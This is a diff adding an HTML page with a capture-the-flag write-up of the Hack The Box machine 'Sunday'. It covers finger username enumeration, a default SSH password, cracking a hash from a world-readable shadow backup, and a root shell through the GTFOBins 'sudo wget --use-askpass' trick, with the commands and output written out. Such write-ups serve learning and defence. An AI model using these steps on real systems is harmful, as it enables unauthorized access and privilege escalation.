@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Sunday &middot; Writeups</title>
+<link rel="stylesheet" href="style.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+</head>
+<body>
+<header class="topbar">
+  <a class="home" href="./index.html">&larr; all writeups</a>
+  <span class="brand">SAMSON &middot; CTF</span>
+</header>
+<main class="article">
+  <div class="boxhead">
+    <div class="bh-left">
+      <span class="badge htb">HTB</span>
+      <span class="badge os">Linux</span>
+      <span class="badge deep">in-depth</span>
+    </div>
+    <h1>Sunday</h1>
+    
+    <div class="tags"><span class="tag">Linux</span><span class="tag">Finger</span><span class="tag">Solaris</span><span class="tag">PasswordSpray</span><span class="tag">SSH</span><span class="tag">ShadowBackup</span><span class="tag">john</span><span class="tag">sudo</span><span class="tag">wget</span><span class="tag">GTFOBins</span></div>
+  </div>
+  <div class="layout">
+    <nav class="toc"><a class="lvl2" href="#overview">Overview</a><a class="lvl2" href="#recon">Recon</a><a class="lvl3" href="#port-scan">Port Scan</a><a class="lvl3" href="#finger-user-enumeration">Finger User Enumeration</a><a class="lvl2" href="#foothold">Foothold</a><a class="lvl3" href="#default-ssh-credentials">Default SSH Credentials</a><a class="lvl2" href="#privilege-escalation">Privilege Escalation</a><a class="lvl3" href="#shadow-backup-hash-crack">Shadow Backup → Hash Crack</a><a class="lvl3" href="#wget-sudo-root">wget sudo → Root</a><a class="lvl2" href="#root">Root</a><a class="lvl2" href="#takeaways">Takeaways</a></nav>
+    <article class="body"><h2 id="overview">Overview</h2>
+<p>Sunday is an easy Hack The Box machine running Oracle Solaris, a platform you don't see often on HTB. The <code>finger</code> service leaks valid usernames; a trivial default password gets a foothold. A world-readable shadow file backup in <code>/backup</code> yields a crackable hash for a second user. That user can run <code>wget</code> as root, and the GTFOBins technique for <code>wget</code> escalates to a root shell.</p>
+<h2 id="recon">Recon</h2>
+<h3 id="port-scan">Port Scan</h3>
+<pre><code class="language-sh">PORT      STATE SERVICE VERSION
+79/tcp    open  finger?
+111/tcp   open  rpcbind 2-4 (RPC #100000)
+515/tcp   open  printer
+6787/tcp  open  http    Apache httpd
+22022/tcp open  ssh     OpenSSH 8.4 (protocol 2.0)
+</code></pre>
+<p>The <code>finger</code> service on 79 and non-standard SSH on 22022 are the leads.</p>
+<h3 id="finger-user-enumeration">Finger User Enumeration</h3>
+<p>The <code>finger-user-enum.pl</code> Perl script brute-forces valid usernames against the finger daemon:</p>
+<pre><code class="language-perl">perl finger-user-enum.pl -U /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -t 10.129.23.89
+</code></pre>
+<p>Valid usernames returned:</p>
+<pre><code>sunny@10.129.23.89
+sammy@10.129.23.89
+root@10.129.23.89
+</code></pre>
+<blockquote>
+<p><strong>Why finger leaks usernames:</strong> the <code>finger</code> protocol was designed to query information about logged-in users. Many implementations respond differently to valid vs. invalid usernames even when no one is logged in, making username enumeration trivial against any system running <code>fingerd</code>.</p>
+</blockquote>
+<h2 id="foothold">Foothold</h2>
+<h3 id="default-ssh-credentials">Default SSH Credentials</h3>
+<p>With usernames in hand, trying the obvious default <code>sunny:sunday</code> against SSH on port 22022 succeeds immediately:</p>
+<pre><code class="language-sh">ssh sunny@10.129.23.89 -p 22022
+(sunny@10.129.23.89) Password: [sunday]
+Oracle Solaris 11.4.42.111.0    Assembled December 2021
+sunny@sunday:~$ whoami
+sunny
+</code></pre>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="shadow-backup-hash-crack">Shadow Backup → Hash Crack</h3>
+<p>The directory <code>/backup</code> contains a world-readable shadow file backup:</p>
+<pre><code>sunny@sunday:/backup$ cat shadow.backup
+sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::
+sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::
+</code></pre>
+<blockquote>
+<p><strong>Why a shadow backup matters:</strong> <code>/etc/shadow</code> is normally root-readable only. A backup copy left in a world-readable location defeats that protection entirely. Both hashes here are <code>sha256crypt</code> (<code>$5$</code>), which john handles well.</p>
+</blockquote>
+<p>Save sammy's hash and crack it:</p>
+<pre><code class="language-sh">john hash --wordlist=/usr/share/wordlists/rockyou.txt
+cooldude!        (sammy)
+</code></pre>
+<p>Credentials gained:</p>
+<pre><code>sammy : cooldude!
+</code></pre>
+<h3 id="wget-sudo-root">wget sudo → Root</h3>
+<p>SSH in as sammy and check sudo rights:</p>
+<pre><code class="language-sh">ssh sammy@10.129.23.89 -p 22022
+-bash-5.1$ sudo -l
+    (root) NOPASSWD: /usr/bin/wget
+</code></pre>
+<blockquote>
+<p><strong>The GTFOBins <code>wget</code> sudo trick:</strong> <code>wget</code> supports <code>--use-askpass</code>, which executes an external program to supply the password for authentication. When that program is a shell script that execs <code>/bin/sh</code> on file descriptor 0, and <code>wget</code> is running as root, the result is a root shell. No network request is ever made, <code>wget</code> invokes the script locally before attempting any connection.</p>
+</blockquote>
+<pre><code class="language-sh">-bash-5.1$ TF=$(mktemp)
+-bash-5.1$ chmod +x $TF
+-bash-5.1$ echo -e '#!/bin/sh\n/bin/sh 1&gt;&amp;0' &gt;$TF
+-bash-5.1$ sudo wget --use-askpass=$TF 0
+root@sunday:/home/sammy# whoami
+root
+</code></pre>
+<h2 id="root">Root</h2>
+<pre><code class="language-sh">root@sunday:/home/sammy# cat /root/root.txt
+‹redacted›
+</code></pre>
+<p>User flag was also readable at <code>/root/root.txt</code> after escalation (the notes show both flags were retrieved from the root shell):</p>
+<pre><code class="language-sh">root@sunday:/home/sammy# cat user.txt
+‹redacted›
+</code></pre>
+<h2 id="takeaways">Takeaways</h2>
+<ul>
+<li><strong><code>finger</code> is a username oracle.</strong> Any system running <code>fingerd</code> should be tested for user enumeration before moving on to other vectors.</li>
+<li><strong>Default credentials are worth trying on every account.</strong> The username <code>sunny</code> and the box name <code>sunday</code> as the password is the kind of guess that pays off regularly.</li>
+<li><strong>World-readable backup files of sensitive data are a direct privesc path.</strong> <code>/backup/shadow.backup</code> gave crackable hashes for both users.</li>
+<li><strong>GTFOBins covers <code>wget</code> sudo.</strong> The <code>--use-askpass</code> trick is non-obvious but reliable when <code>wget</code> is in the sudoers list.</li>
+</ul></article>
+  </div>
+</main>
+<footer class="foot">Samson Laird &middot; retired-machine writeups &middot; secrets redacted</footer>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>hljs.highlightAll();</script>
+</body>
+</html>
